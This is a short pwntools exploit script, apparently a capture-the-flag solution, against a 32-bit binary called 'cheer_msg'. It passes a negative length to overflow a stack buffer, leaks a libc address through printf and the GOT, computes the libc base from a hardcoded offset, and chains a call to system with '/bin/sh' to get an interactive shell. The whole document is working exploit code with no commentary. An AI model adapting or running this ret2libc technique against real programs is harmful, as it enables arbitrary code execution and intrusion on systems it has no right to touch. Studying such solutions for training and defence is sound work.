from pwn import *
import sys, time

context.binary = "./cheer_msg"
binary = ELF("./cheer_msg")
p = process(["./cheer_msg"])
pause()

main = 0x80485ca
binsh = 0x15b9ab
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

p.sendlineafter(">> ", str(-0x10 * 5 - 30))
p.sendline("A" * 0x28 + "B" * 4 + p32(0xdeadbeef) + p32(binary.plt["printf"]) + p32(main) + p32(binary.got["printf"]))
p.recvuntil("Thank you")
p.recvuntil("\n")
p.recvuntil("\n")
libc_base = u32(p.recv(4)) - 0x49670
log.info("libc_base : " + hex(libc_base))
p.sendlineafter(">> ", str(-0x10 * 5 - 30))
p.sendline("A" * 0x28 + "B" * 4 + p32(0xdeadbeef) + p32(libc_base + libc.symbols["system"]) + p32(0xcafebabe) + p32(libc_base + binsh))
p.interactive()
